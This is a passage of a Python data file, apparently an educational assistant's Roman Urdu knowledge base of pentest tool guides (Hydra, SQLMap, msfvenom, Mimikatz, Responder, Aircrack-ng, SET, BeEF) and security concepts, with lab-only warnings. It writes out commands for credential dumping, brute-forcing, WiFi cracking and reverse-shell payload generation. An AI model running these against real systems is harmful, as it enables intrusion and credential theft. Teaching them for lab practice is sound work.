Yaad rakho: Nikto ek website ke liye, OpenVAS poore network ke liye.""",

"Lynis": """Kya hai: Tumhare apne Linux system ki security audit - kya kamzor hai, kya theek karna hai, sab batata hai. Defender wala tool hai.
Zaroori commands:
- lynis audit system : poori audit
- Report mein 'Warnings' aur 'Suggestions' parho, aur akhir mein 'Hardening index' score dekho
Kab kaam ata hai: Apni Kali/server ko mehfooz banana seekhne ke liye.
Yaad rakho: Blue team (defense) ke liye sona hai - scan doosron ko nahi, khud ko karta hai.""",

"Burp Suite": """Kya hai: Web hacking ka sab se ahem tool. Browser aur website ke darmiyan baith kar har request ko rokta, badalta aur dohrata hai.
Kaise chalta hai:
- Burp kholo, browser ka proxy 127.0.0.1:8080 set karo (FoxyProxy asaan hai)
- Intercept ON karke request roko, values badal kar forward karo
- Repeater: ek request ko bar bar badal kar bhejna
- Intruder: hazaron koshishen khud bakhud (login fuzzing waghera)
Kab kaam ata hai: Login forms, prices, IDs - har web kamzori ka haath se test.
Yaad rakho: Free (Community) version student ke liye kaafi hai.""",

"OWASP ZAP": """Kya hai: OWASP ka free web scanner aur proxy - Burp ka muqabla, lekin pura free aur open source.
Kaise chalta hai:
- zaproxy chalao, site ka URL do, 'Automated Scan' dabao
- Spider pehle site ke saare pages dhundta hai, phir Active Scan hamlay karke dekhta hai
- Alerts mein har kamzori, us ki shiddat aur saboot milta hai
Kab kaam ata hai: Jaldi mein poori web app ka muft scan.
Yaad rakho: ZAP = free + automated, Burp = manual gehraai. Dono seekho.""",

"Gobuster": """Kya hai: Website par chhupi hui directories aur files wordlist se dhundta hai (masalan /admin, /backup.zip).
Zaroori commands:
- gobuster dir -u http://TARGET -w wordlist.txt : directory mode
- -x php,html : in extensions wali files bhi dhundo
- -t 50 : 50 threads, tez scan
- gobuster dns -d example.com -w subs.txt : subdomain mode
Wordlist kahan hai: /usr/share/wordlists/dirb/common.txt (Kali mein ready)
Aam ghalti: 404 aur 403 ka farq na samajhna - 403 matlab 'hai lekin band hai', wo bhi info hai.
Yaad rakho: Jo cheez menu mein nahi dikhti, wo Gobuster dhundta hai.""",

"WPScan": """Kya hai: Sirf WordPress sites ke liye scanner - purane plugins, themes aur kamzor passwords check karta hai.
Zaroori commands:
- wpscan --url http://TARGET : basic scan
- wpscan --url http://TARGET -e p : sirf plugins enumerate
- wpscan --url http://TARGET -e u : users enumerate
- wpscan --url http://TARGET --enumerate vp : kamzor (vulnerable) plugins
Kab kaam ata hai: Duniya ki 40% websites WordPress par hain - ye tool roz kaam ata hai.
Yaad rakho: Plugin purana = darwaza khula.""",

"WhatWeb": """Kya hai: Website ko 'pehchanta' hai - kis CMS, framework, server aur technology par bani hai.
Zaroori commands:
- whatweb http://TARGET : basic pehchan
- whatweb -a 3 http://TARGET : aggressive (zyada gehra)
- whatweb http://TARGET -v : tafseel se
Kab kaam ata hai: Scan ki shuruaat mein - technology pata chale to hamla usi hisab se.
Yaad rakho: Pehle pehchan (WhatWeb), phir scan (Nikto), phir haath ka test (Burp).""",

"SQLMap": """Kya hai: SQL injection ko khud bakhud test aur exploit karta hai - database ke naam, tables, data tak.
Zaroori commands:
- sqlmap -u "http://TARGET/page?id=1" : sirf test karo ke injection hai ya nahi
- --dbs : databases ki list
- -D database_naam --tables : us database ke tables
- -D db -T table --dump : data nikalna (sirf lab/CTF mein!)
- --batch : har sawal ka jawab khud 'yes' dedo
Aam ghalti: Bina --batch ke har qadam par ruka rehta hai; aur asli sites par ye ghair-qanooni hai - sirf apni lab.
Yaad rakho: Pehle haath se ' laga kar test karo, phir SQLMap chalao - samajh aise hi banti hai.""",

"SQLite Browser": """Kya hai: SQLite database files (.db) ko khol kar tables aur data dekhne ka asaan graphical tool.
Kaise chalta hai: Program kholo, 'Open Database' se .db file chuno, 'Browse Data' mein har table dekho.
Kab kaam ata hai: Android apps, browser data, chhoti apps ke andar ka data parhna (forensics mein bhi).
Yaad rakho: SQL seekhne ki shuruaat ke liye behtareen - bina command ke database samajh ata hai.""",
}

GUIDES.update({
"Hydra": """Kya hai: ONLINE password brute-force tool - zinda service (SSH, FTP, web login) par hazaron passwords try karta hai.
Zaroori commands:
- hydra -l admin -P wordlist.txt TARGET ssh : ek user, password list
- -L users.txt -P pass.txt : users ki list bhi
- -t 4 : 4 threads (zyada threads service ko gira sakte hain)
- -f : password milte hi ruk jao
- Web form ke liye: hydra TARGET http-post-form "..." (syntax mushkil hai, pehle samajh kar likho)
Farq yaad rakho: Hydra = online (service par hamla), John/Hashcat = offline (hash file par).
Aam ghalti: Asal accounts lock ho jate hain bar bar try karne se - sirf apni lab.""",

"John the Ripper": """Kya hai: OFFLINE hash cracker - chori/shuda hash file ko apni machine par aaram se crack karta hai, koi network nahi.
Zaroori commands:
- john hashes.txt : khud pehchan kar crack
- john --wordlist=rockyou.txt hashes.txt : wordlist se
- john --format=raw-md5 hashes.txt : format bata kar (MD5 waghera)
- john --show hashes.txt : jo crack hue, dikhao
- john --incremental hashes.txt : har mumkin combination (bohat slow)
Wordlist: /usr/share/wordlists/rockyou.txt (Kali mein, pehle gunzip karna parta hai)
Yaad rakho: Pehle hash ki type pehchano (hashid tool), phir John chalao.""",

"Hashcat": """Kya hai: John ka GPU wala bhai - graphics card ki taqat se duniya ka tez tareen hash cracker.
Zaroori commands:
- hashcat -m 0 hash.txt wordlist.txt : -m 0 matlab MD5
- -m 1000 : NTLM (Windows hashes), -m 1400: SHA-256, -m 3200: bcrypt
- -a 0 : wordlist attack, -a 3 : brute-force (mask attack)
- hashcat -m 0 -a 3 hash.txt ?d?d?d?d : 4 digit PIN jaisi koshish (?d = digit)
- --show : crack hue dikhao
Aam ghalti: Galat -m number = kabhi crack nahi hoga. Pehle hash type confirm karo.
Yaad rakho: Laptop ke CPU par John, GPU mile to Hashcat.""",

"Medusa": """Kya hai: Hydra jaisa online brute-forcer - kai services (SSH, FTP, SMB, MySQL) support karta hai, tez aur stable.
Zaroori commands:
- medusa -h TARGET -u admin -P pass.txt -M ssh
- -H hosts.txt : kai machines
- -U users.txt : users ki list
- -F : pehla password milte hi ruk
Kab kaam ata hai: Jab Hydra kisi service par masla kare, Medusa dusra option hai.
Yaad rakho: Kaam ek jaisa, syntax thora mukhtalif - ek mein mahir ho jao.""",

"CeWL": """Kya hai: Kisi website ke saare alfaaz ikathay karke CUSTOM wordlist banata hai - usi company/insaan ke passwords guess karne ke liye.
Zaroori commands:
- cewl http://TARGET -w words.txt : basic list
- -d 2 : 2 page gehraai tak jao
- -m 5 : kam az kam 5 harf wale alfaaz
- --with-numbers : numbers walay alfaaz bhi
Kab kaam ata hai: Aam wordlist fail ho to - log aksar company ke naam, sheher, saal wala password rakhte hain.
Yaad rakho: Aam list = sab ke liye, CeWL list = sirf us target ke liye.""",

"Aircrack-ng": """Kya hai: WiFi (WEP/WPA) ka mashhoor suite - handshake pakarna aur password crack karna.
Qadam (sirf APNE router/lab par):
1. airmon-ng start wlan0 : card ko monitor mode mein dalo
2. airodump-ng wlan0mon : aas paas ke networks dekho
3. airodump-ng -c <channel> --bssid <AP ka MAC> -w capture wlan0mon : ek network ko record karo
4. aireplay-ng --deauth 5 -a <AP MAC> wlan0mon : kisi client ko disconnect karke handshake pakro
5. aircrack-ng capture-01.cap -w rockyou.txt : password crack karo
Note: Monitor mode ke liye khaas WiFi adapter chahiye hota hai - laptop ka andar wala card aksar nahi chalta.
Yaad rakho: Password kamzor ho to crack hota hai, mazboot ho to nahi - yehi is ki taleem hai.""",

"Wifite": """Kya hai: Aircrack ke saare qadam khud bakhud karne wala tool - ek command mein WiFi audit.
Zaroori commands:
- wifite : chala kar target chuno (number likho)
- wifite --kill : pehle network manager band karke chalao (masla kare to)
- wifite --dict rockyou.txt : apni wordlist do
Kab kaam ata hai: Jaldi wala WiFi test, jab haath ke qadam yaad hon aur waqt kam ho.
Aam ghalti: Pehle Aircrack haath se seekho - Wifite andha istemal samajh nahi deta.
Yaad rakho: Pehle manual (Aircrack), phir auto (Wifite).""",

"Reaver": """Kya hai: Purane routers ke WPS PIN par hamla - WPS on ho to password ghanton mein mil sakta hai.
Zaroori commands:
- wash -i wlan0mon : kon se routers par WPS on hai
- reaver -i wlan0mon -b <BSSID> -vv : hamla shuru
- -c <channel> : channel bata kar tez karo
Note: Naye routers mein WPS band ya lock ho jata hai - ye kamzori purane setup ki hai.
Yaad rakho: Apne router mein WPS band rakho - yehi is tool ki sab se bari seekh.""",

"Kismet": """Kya hai: Wireless networks ka detector aur sniffer - chhupe hue (hidden) networks aur devices bhi dhundta hai.
Kaise chalta hai: kismet chalao, browser mein http://localhost:2501 kholo - saare networks, un ke clients, signal sab nazar ata hai.
Kab kaam ata hai: WiFi ki poori survehal (survey) - kaun sa network kahan, kis channel par.
Yaad rakho: Kismet sirf dekhta hai (passive), hamla nahi karta - is liye pakra bhi nahi jata.""",

"Metasploit Framework": """Kya hai: Exploitation ka sab se bara framework - hazaron ready exploits, payloads aur post modules.
Zaroori commands (msfconsole ke andar):
- search <naam> : exploit dhundo (masalan search vsftpd)
- use exploit/... : module chuno
- show options : kya kya set karna hai dekho
- set RHOSTS TARGET : target do
- set LHOST <apna IP> : apna address (reverse connection ke liye)
- run / exploit : chalao
- sessions -l : khule sessions dekho
Pehla practice target: Apni lab ki Metasploitable VM (jaan bojh kar kamzor machine).
Aam ghalti: RHOSTS (target) aur LHOST (tum) ulta likhna - sab se aam ghalti hai.
Yaad rakho: Metasploit chalana asaan hai, samajhna asal skill hai - pehle kamzori samjho, phir module.""",

"MSFvenom": """Kya hai: Metasploit ka payload banane wala hissa - lab practice ke liye payloads generate karta hai.
Zaroori commands:
- msfvenom -l payloads : saare payloads dekho
- -p windows/meterpreter/reverse_tcp : payload chuno
- LHOST=YOUR_IP LPORT=4444 : wapas connection kahan aye
- -f exe > shell.exe : format aur file
- Phir Metasploit mein 'exploit/multi/handler' chala kar connection ka intezar karo
Note: Ye sirf apni lab ki machines par - asal duniya mein ye file bhejna crime hai.
Yaad rakho: Venom = payload banana, Handler = usay pakarna. Jodi hai dono ki.""",

"SearchSploit": """Kya hai: Exploit-DB (mashhoor exploit website) ki OFFLINE copy ko search karta hai - internet ke baghair.
Zaroori commands:
- searchsploit apache 2.4 : software + version se dhundo
- searchsploit -m <number> : exploit ko apni folder mein copy karo
- searchsploit --id <EDB-ID> : tafseel
- searchsploit -u : database update
Kab kaam ata hai: Nmap se version mila (masalan vsftpd 2.3.4) - SearchSploit se us ka exploit dhundo.
Yaad rakho: Version number = khoj ki chabi. Isi liye -sV scan itna ahem hai.""",

"Wireshark": """Kya hai: Network ki 'X-ray machine' - har packet ko pakar kar andar tak dikhata hai.
Kaise chalta hai:
- Interface chuno (eth0/wlan0), capture shuru - packets ana shuru
- Filters: http (sirf web traffic), ip.addr == 192.168.1.5 (ek machine), tcp.port == 80, dns
- Kisi packet par right-click > Follow > TCP Stream : poori guftagu ek saath parho
Kab kaam ata hai: Password plain text mein ja raha hai? Login kaam kyun nahi kar raha? Sab jawab yahan.
Yaad rakho: Bina filter ke samandar hai - filter hi Wireshark ki asal taqat hai.""",

"Tcpdump": """Kya hai: Terminal par packet capture - Wireshark ka halka, tez sathi. Serveron par GUI nahi hoti, wahan yehi chalta hai.
Zaroori commands:
- tcpdump -i eth0 : interface par suno
- tcpdump -i eth0 host 192.168.1.5 : sirf ek machine
- tcpdump -i eth0 port 80 : sirf ek port
- tcpdump -i eth0 -w file.pcap : file mein save (baad mein Wireshark mein kholo)
- tcpdump -r file.pcap : purani file parho
Yaad rakho: Tcpdump se pakro, Wireshark mein samjho - ye mashhoor jodi hai.""",

"Bettercap": """Kya hai: Network attacks ka modern framework - MITM (beech mein baithna), sniffing, spoofing sab ek jagah. Ettercap ka jadeed roop.
Zaroori cheezein (sirf lab mein):
- bettercap -iface eth0 : chalao
- net.probe on : network ke devices dhundo
- net.show : list dekho
- arp.spoof on : ARP spoofing (sirf apni lab ki machines ke darmiyan!)
- net.sniff on : traffic suno
Aam ghalti: Ye asal network ko kharab kar sakta hai - kabhi university/ghar ke asal network par nahi.
Yaad rakho: MITM samajhne ke liye behtareen, aur is se bachao (HTTPS, VPN) bhi yehi sikhata hai.""",

"Responder": """Kya hai: Windows networks mein naam-poisoning (LLMNR/NBT-NS) se logon ke password HASHES pakarta hai - office networks ki mashhoor kamzori.
Zaroori commands:
- responder -I eth0 : interface par chalao
- Pakre hue hashes 'logs' folder mein jate hain
- Phir un hashes ko Hashcat (-m 5600, NetNTLMv2) se crack karte hain
Kab kaam ata hai: Windows/Active Directory wale lab mein - ek file kholna hi hash de deta hai.
Yaad rakho: Defender isay foran pakar sakta hai - lekin technique jaanna pentester ka kaam hai.""",
})

GUIDES.update({
"Mimikatz": """Kya hai: Windows ki memory (LSASS) se passwords, hashes aur tickets nikalne wala mashhoor tool - post-exploitation ki pehchan.
Zaroori commands (mimikatz ke andar):
- privilege::debug : pehle debug haq lo
- sekurlsa::logonpasswords : memory mein mojood passwords/hashes
- lsadump::sam : SAM database se hashes
- vault::list : saved credentials
Kab kaam ata hai: Ek Windows machine mil jaye to usi ke passwords se baaki network khulta hai (lab mein seekho).
Defender note: Antivirus isay foran pakarta hai - asal maqsad technique samajhna hai.
Yaad rakho: Password memory mein saaf bhi hota hai - yehi Windows ki sakht seekh hai.""",

"BloodHound": """Kya hai: Active Directory (office networks) ke attack paths ki graph - kaun kis par admin hai, kahan se Domain Admin tak rasta hai.
Kaise chalta hai:
- Pehle SharpHound (collector) network se data jama karta hai
- BloodHound us data ki graph banata hai
- 'Find Shortest Path to Domain Admins' jaisi ready queries chalti hain
Kab kaam ata hai: Bare office network mein andha ghoomna khatam - rasta graph dikha deta hai.
Yaad rakho: Hamla rasta dhundne se jeeta jata hai, BloodHound wohi rasta dikhata hai.""",

"NetExec": """Kya hai: Windows networks ko test karne wala tool (purana naam CrackMapExec). Ek saath kai machines par login check, command chalana, info lena.
Zaroori commands:
- netexec smb TARGET : machine ki info
- netexec smb 192.168.1.0/24 -u user -p pass : poore network par ek password check (spraying, sirf lab)
- -x "command" : command chalao (jahan haq mile)
- --shares : shares dekho
Kab kaam ata hai: Ek password mil jaye to dekho kahan kahan chalta hai.
Yaad rakho: CrackMapExec band ho gaya tha - NetExec usi ka naya, zinda roop hai.""",

"Autopsy": """Kya hai: Disk forensics ka graphical tool - kisi hard disk ki image khol kar deleted files, browser history, documents sab tehqeeq.
Kaise chalta hai:
- 'New Case' banao, disk image (.E01/.dd) do
- Left side se file types, deleted files, history browse karo
- 'Timeline' se dekho kab kya hua
Kab kaam ata hai: Koi machine mile to us par kya hua tha - ye forensics ka pehla tool hai.
Yaad rakho: Asal disk par kabhi kaam nahi - hamesha us ki IMAGE par. Ye forensics ka pehla usool hai.""",

"Volatility": """Kya hai: RAM (memory) dump ka analysis - jab machine band ho jaye to disk rehti hai, lekin chalti hui haalat sirf memory mein hoti hai.
Zaroori commands (Volatility 3):
- vol -f memory.raw windows.info : dump ki bunyadi info
- windows.pslist : chalti hui processes
- windows.netscan : network connections
- windows.cmdline : kis ne kya chalaya
- windows.hashdump : password hashes (memory se)
Kab kaam ata hai: Malware kis process mein tha? Kis server se judda tha? Jawab memory deti hai.
Yaad rakho: Disk = maazi, Memory = haal. Dono parho.""",

"Binwalk": """Kya hai: Kisi file (khaas tor par router firmware) ke andar chhupi hui files aur filesystems dhund kar nikalta hai.
Zaroori commands:
- binwalk firmware.bin : andar kya kya hai, list
- binwalk -e firmware.bin : sab nikaal lo
- binwalk --dd='.*' firmware.bin : zabardasti sab extract
Kab kaam ata hai: IoT/router ki security research ki shuruaat.
Yaad rakho: Ek file ke andar poori duniya (filesystem) chhupi hoti hai.""",

"Foremost": """Kya hai: File carving tool - disk image se deleted files un ke 'headers' pehchan kar wapas nikalta hai.
Zaroori commands:
- foremost -i disk.img : saari qism ki files recover
- foremost -t jpg,pdf -i disk.img : sirf ye types
- Output 'output' folder mein, audit.txt mein report
Kab kaam ata hai: Delete karna = khatam karna nahi hota - ye forensics ka sab se bara sabak.
Yaad rakho: Isi liye purana hard disk bechne se pehle data sahi tarah mitana zaroori hai.""",

"TinEye": """Kya hai: Reverse image search engine (tineye.com) - ek photo do, ye batata hai ye photo internet par kahan kahan hai aur sab se pehle kahan ayi thi. Photo ki 'history' nikalta hai.
Kaise istemal: tineye.com kholo, photo upload karo ya photo ka link (URL) paste karo. Results mein har wo website a jati hai jahan yehi photo (ya is se milti julti) pari hai.
Kaam ki baatein: Fake profile ki photo check karna (aisi photos aksar kahin se churayi hui hoti hain), apni photo kahan kahan istemal hui dekhna, kisi viral photo ka asal source maloom karna.
Aam ghalti: Result na mile to samajhna ke photo 'asli' hai - TinEye ka database mehdood hai, Google Lens aur Yandex Images se bhi cross-check karo.
Yaad rakho: TinEye PHOTO ka pata batata hai, photo wale banday ka nahi - ye image OSINT hai, chehra-pehchan (face recognition) nahi.""",

"Shodan": """Kya hai: 'Devices ka Google' - poore internet se jude servers, cameras, routers ko search karta hai. Scan nahi karta, pehle se jama ki hui info dikhata hai.
Kaise istemal hota hai:
- shodan.io par search: apache, webcam, port:3389, country:PK jaisi filters
- CLI: shodan search "apache" / shodan host <IP>
- Har result mein banner milta hai: service, version, port
Kab kaam ata hai: Kisi company ke internet par khule hue servers dekhna (public info).
Yaad rakho: Shodan batata hai ke tumhara apna router bhi duniya ko kya dikha raha hai - apna IP search karke dekho.""",

"SpiderFoot": """Kya hai: OSINT ki automation - ek domain/IP/email do, ye 200+ sources se khud info jama karke graph bana deta hai.
Kaise chalta hai:
- spiderfoot chalao, browser mein http://127.0.0.1:5001 kholo
- 'New Scan' mein target aur modules chuno, scan chalao (waqt lagta hai)
Kab kaam ata hai: Haath se 10 websites kholne ki bajaye ek jagah mukammal OSINT.
Yaad rakho: Tools info jama karte hain, faisla tum karte ho - galat nateeja nikalna asaan hai, verify karo.""",

"Sublist3r": """Kya hai: Kisi domain ke subdomains tezi se dhundta hai - search engines aur public sources se.
Zaroori commands:
- sublist3r -d example.com : basic
- sublist3r -d example.com -o subs.txt : file mein save
- sublist3r -d example.com -b : brute force bhi karo
- sublist3r -d example.com -t 20 : threads zyada, tez
Kab kaam ata hai: mail., dev., test., vpn. - ye chhupe subdomains aksar kamzor hote hain.
Yaad rakho: Asal nishana aksar subdomain par hota hai, main site par nahi.""",

"Amass": """Kya hai: OWASP ka mashhoor OSINT tool - subdomains aur network ki gehri mapping, Sublist3r se zyada taqatwar.
Zaroori commands:
- amass enum -d example.com : enumeration
- amass enum -d example.com -o results.txt : save
- amass intel -d example.com : company ki aur info
- amass db -d example.com : purane results dekho
Kab kaam ata hai: Bari companies ki attack surface samajhna.
Yaad rakho: Amass slow lekin gehra, Sublist3r tez lekin satahi - dono ka waqt alag hai.""",

"Nessus": """Kya hai: Duniya ka sab se mashhoor commercial vulnerability scanner - companies yehi istemal karti hain.
Sachai: Ye OpenVAS ki tarah pura free NAHI hai. 'Nessus Essentials' free hai lekin sirf 16 IPs tak.
Kaise chalta hai:
- Install ke baad: systemctl start nessusd
- Browser: https://localhost:8834 - scan banao, target do, report lo
Kab kaam ata hai: Naukri (SOC/pentest) mein Nessus ka tajurba bohat maanga jata hai - Essentials se seekh sakte ho.
Yaad rakho: Free seekhne ke liye OpenVAS, CV mein likhne ke liye Nessus ka naam - dono ki report parhna seekho.""",

"FFUF": """Kya hai: Bohat tez web fuzzer - URL mein FUZZ likho, wordlist ke har lafz ko wahan try karke dekhta hai.
Zaroori commands:
- ffuf -u http://TARGET/FUZZ -w wordlist.txt : directories/files
- ffuf -u "http://TARGET/page?user=FUZZ" -w users.txt : parameter fuzzing
- -mc 200,403 : sirf ye status codes dikhao (shor kam)
- -fs 1234 : is size ke jawab chhupao
- -recursion : mile hue folder ke andar bhi dhundo
Aam ghalti: Bina filter ke hazaron nakli results - -mc/-fs se safai karo.
Yaad rakho: Gobuster asaan, FFUF tez aur lachakdar (flexible).""",

"WFuzz": """Kya hai: Purana aur mashhoor web fuzzer - FUZZ wale har nuqte par wordlist try karta hai.
Zaroori commands:
- wfuzz -w wordlist.txt http://TARGET/FUZZ
- -z file,users.txt : wordlist doosri tarah dena
- --hc 404 : 404 walay chhupao
- wfuzz -w pass.txt -H "Cookie: session=FUZZ" ... : headers mein fuzzing bhi ho sakti hai
Kab kaam ata hai: Jab fuzzing kisi ajeeb jagah (header, cookie) par karni ho.
Yaad rakho: FFUF aaj kal zyada chalta hai, lekin WFuzz ki soch (FUZZ point) har jagah kaam ati hai.""",

"Ghidra": """Kya hai: America ki NSA ka banaya hua FREE reverse engineering tool - kisi program (.exe) ko khol kar us ka code dobara parhne jaisa bana deta hai (decompiler).
Kaise chalta hai:
- Project banao, file import karo, double-click - 'CodeBrowser' khulta hai
- Analysis khud chalti hai; 'Decompiler' window mein C jaisa code parho
- Functions ki list se 'main' ya dilchasp function dhundo
Kab kaam ata hai: Malware andar se kya karta hai? CTF mein program ka secret kahan chhupa hai?
Yaad rakho: IDA Pro paid hai, Ghidra muft mein wohi darwaza kholta hai - student ke liye sona.""",

"Radare2": """Kya hai: Command-line reverse engineering framework - Ghidra ka terminal wala, halka aur tez sathi.
Zaroori commands:
- r2 file.bin : file kholo
- aaa : pura analysis karo (analysis all)
- afl : functions ki list
- pdf @ main : main function ka code (disassembly)
- iz : file ke andar ke texts (strings) dekho
- q : bahar
Aam ghalti: 'aaa' kiye baghair kuch samajh nahi ata - pehla kaam analysis hai.
Yaad rakho: Pehle 'strings' aur 'iz' se saste suragh, phir gehra analysis.""",

"Steghide": """Kya hai: Steganography tool - photo/audio file ke andar data chhupata aur nikalta hai, photo bilkul waisi hi dikhti hai.
Zaroori commands:
- steghide embed -cf photo.jpg -ef secret.txt : data chhupao (password lagega)
- steghide extract -sf photo.jpg : data nikalo (password chahiye)
- steghide info photo.jpg : pehle check karo kuch chhupa hai ya nahi
Kab kaam ata hai: CTF mein bohat ata hai - photo mili, andar flag chhupa hota hai.
Yaad rakho: Chhupana asaan, baghair password ke nikalna mushkil - hamesha pehle 'info' chalao.""",

"SET (Social-Engineer Toolkit)": """Kya hai: Social engineering ki practice ka toolkit - insaan ko nishana banane wale hamlay (fake login pages waghera) seekhne ke liye.
Kaise chalta hai:
- setoolkit chalao (root), menu se hamlay ki qism chuno (masalan Spear-Phishing, Website Attack Vectors)
- 'Credential Harvester' kisi site ki nakli copy bana kar login deta hai (LAB mein!)
Sakht note: Ye sirf taleem aur apni lab ke liye hai. Asal logon par phishing karna har jagah crime hai - ek click se zindagi barbaad ho sakti hai, apni bhi.
Defender seekh: Asli site ka URL gौर se dekhna, 2FA lagana - yehi bachao hai.
Yaad rakho: Sab se kamzor password nahi, INSAAN hota hai - aur usi ko mehfooz karna asal security hai.""",

"BeEF": """Kya hai: Browser Exploitation Framework - ek hooked browser ko control karke dikhata hai ke sirf ek galat link kitna khatarnak hai.
Kaise chalta hai:
- beef-xss chalao, admin panel http://127.0.0.1:3000/ui/panel
- 'hook.js' wali file jo browser khole, wo 'zombie' ban jata hai - phir modules se us ki info, screenshot waghera (LAB mein)
Kab kaam ata hai: Ye samajhne ke liye ke browser khud ek darwaza hai.
Yaad rakho: Anjaan links par click na karna - BeEF usi ek click ki taqat dikhata hai.""",
})

# ---------------------------------------------------------------------------
# CONCEPTS - bunyadi ilm jo har sawal se pehle kaam ata hai
# ---------------------------------------------------------------------------
CONCEPTS = [
{"title": "Pentest ke 5 Marhalay (Methodology)",
 "body": """Har ethical hack isi tartib se hota hai:
1. Recon (Information Gathering) - target ki info jama: Nmap, Shodan, theHarvester
2. Scanning & Enumeration - ports, services, versions, users: Nmap -sV, Gobuster
3. Vulnerability Analysis - kamzori dhundna: Nikto, OpenVAS, SearchSploit
4. Exploitation - kamzori ka faida: Metasploit, SQLMap, Burp
5. Post Exploitation & Report - andar reh kar saboot, phir saaf report
Usool: Bina permission ke koi qadam nahi. Report ke baghair pentest adhoora hai - asal kaam report hi hoti hai.
Yaad rakho: Pehle janna, phir dhundna, phir torna, phir batana."""},

{"title": "Mashhoor Ports aur Services",
 "body": """Ye ports viva aur kaam dono mein bar bar ate hain:
21 FTP (files) - 22 SSH (secure login) - 23 Telnet (purana, ghair-mehfooz)
25 SMTP (email bhejna) - 53 DNS (naam se IP) - 80 HTTP (web)
110 POP3 / 143 IMAP (email lena) - 443 HTTPS (mehfooz web)
445 SMB (Windows file sharing) - 1433 MSSQL - 3306 MySQL
3389 RDP (Windows remote desktop) - 5432 PostgreSQL - 8080 alternate web
Trick: 22 = SSH (2 = Secure), 443 = 80 ka mehfooz bhai.
Nmap mein port khula mile to ye list zehen mein rakho - agla qadam wahi se banta hai."""},

{"title": "Linux ke 20 Zaroori Commands",
 "body": """pwd (kahan hun) - ls -la (sab files, chupi bhi) - cd (folder badlo)
cat file (parho) - less file (aram se parho) - nano file (edit karo)
cp / mv / rm (copy, move, delete - rm wapas nahi ata!)
mkdir / rmdir - touch file (khali file)
find / -name file.txt 2>/dev/null (poore system mein dhundo)
grep "lafz" file (andar dhundo) - grep -r (har file mein)
chmod +x file (chalane ki ijazat) - sudo (admin ban kar)
ps aux (chalti processes) - kill PID - top (live nazara)
ip a (apna IP) - ping (rabta check) - ss -tuln (khule ports apni machine ke)
history (purani commands) - man <cmd> (har command ki kitab)
Yaad rakho: Samajh na aye to 'man' aur '--help' - har Linux tool apni kitab saath lata hai."""},

{"title": "Hash kya hota hai? (Passwords ka raaz)",
 "body": """Hash = data ka ek-tarfa fingerprint. Password mehfooz rakhne ke liye system us ka HASH rakhta hai, password khud nahi.
Khaas baatein:
- MD5 aur SHA1 = tez aur purane, aaj kamzor (crack jaldi hote hain)
- bcrypt aur SHA-256 = slow/mazboot, cracking mushkil
- Ek harf badlo, poora hash badal jata hai
- Cracking ka matlab hash ko ulta karna nahi - laakhon passwords ke hash bana kar milana hai (isi liye John/Hashcat tez GPU maangte hain)
- Salt = har password ke saath random izafa, taake tayyar tables (rainbow) fail ho jayen
Viva line: 'Hashing encryption nahi hai - encryption ulta ho sakta hai, hashing nahi.'"""},

{"title": "TCP vs UDP aur 3-Way Handshake",
 "body": """TCP = registered dak (pohanch ki guarantee, tartib ki guarantee). Web, email, SSH isi par.
UDP = aam postcard (tez, lekin guarantee nahi). DNS, video calls, games isi par.
TCP connection aise banti hai (3-Way Handshake):
1. Client: SYN (baat karun?)
2. Server: SYN-ACK (haan, karo)
3. Client: ACK (theek hai)
Nmap se taluq: -sS (stealth scan) teesra qadam pura nahi karta - is liye 'aadha khula' scan khamosh hota hai.
Viva line: 'UDP mein handshake hi nahi hota - is liye UDP scan slow aur mushkil hota hai.'"""},

{"title": "Web ki bunyad: HTTP Status Codes",
 "body": """Server har jawab ke saath number deta hai:
200 OK - mil gaya
301/302 Redirect - doosri jagah bheja
400 Bad Request - tumhari request galat
401 Unauthorized - pehle login karo
403 Forbidden - hai, lekin tumhein ijazat nahi
404 Not Found - ye cheez hai hi nahi
500 Server Error - server ke andar masla
Pentester ke liye: 403 'nahi' nahi hota - wahan kuch HAI, bas band hai (Gobuster mein isiliye 403 dilchasp hota hai).
Yaad rakho: 4xx = tumhari ghalti, 5xx = server ki ghalti."""},

{"title": "Virus / Malware ki pehchan aur bachao",
 "body": """Nishaniyan ke device mein kuch galat hai:
- Machine achanak bohat slow, fan tez, garam hona
- Ajeeb pop-ups, browser ka homepage/search khud badal jana
- Anjaan programs jo tum ne install nahi kiye, startup mein ajana
- Doston ko tumhari taraf se ajeeb links/messages jana
- Files ka na khulna, naam/extension badal jana + paisay maangne wali note file (ransomware!)
Bachao ke usool:
- Defender aur Windows updates hamesha ON
- Downloads/WhatsApp/email se ayi .exe ya file na pehchano to MAT chalao
- Asli software sirf official site se
- Ahem files ka backup alag drive par
- Har account par 2FA
Agar malware mil jaye to: 1) Internet band karo 2) Defender ka FULL scan chalao 3) Khud delete karne ki jaldi mat karo - pehle kisi jaan-ne wale ko dikhao (ya mujhe phone par screenshot bhejo)."""},

{"title": "Location trace ki asal haqiqat",
 "body": """Filmon wala scene - number dala aur naqshe par dot chal para - aam admi ke liye aisa NAHI hota. Asal duniya mein tareeqe ye hain:
1) Mobile company ke records: sirf police ko, court order ke saath milte hain.
2) Us shakhs ke apne account/device tak rasai (Google account waghera): baghair ijazat ye jurm hai.
3) IP address: sirf SHEHER ki had tak batata hai, aksar wo bhi ghalat - ghar ka address kabhi nahi.
4) Photo ki EXIF: log jo photo bhejte hain us ke andar GPS chhupa ho sakta hai - ye log khud de dete hain.
Apni hifazat ke liye:
- Apne phone mein Find My Device ON rakho - apna phone gum ho to khud dhund sakte ho (ye jaiz hai, tumhara apna phone hai).
- Apps ko location permission soch samajh kar do.
- Photo bhejne se pehle location data off kar do (camera settings).
- VPN tumhari IP wali pehchan badal deta hai.
Yaad rakho: kisi aur ko baghair ijazat trace karna PECA ke tehet jurm hai - seekhna ye hai ke trace HOTA kaise hai aur khud ko mehfooz kaise rakhein."""},

{"title": "Username OSINT - tumhara digital footprint",
 "body": """Log aksar har jagah EK hi username rakhte hain - wahi naam ek jagah se doosri jagah ka profile jod deta hai. Investigators, journalists aur security wale pehle yahi karte hain: naam search kiya, public profiles ki list ban gayi.
Zaroori samajh:
- Ye sirf PUBLIC info hai - jo banda khud sab ke liye khula rakhta hai. Private account ke andar is se kuch nahi milta.
- Ek hi username do alag logon ka bhi ho sakta hai - pehchan kabhi ek result se pakki nahi hoti, photo/posts se cross-check lagta hai.
Apna footprint khud audit karo:
1) UMBRA-9 mein apna username daalo - dekho tum kin kin jagah public ho.
2) Jo account istemal nahi, use delete/private karo.
3) Har jagah ek hi naam + ek hi photo = poora profile juda hua. Privacy chahiye to naam mukhtalif rakho.
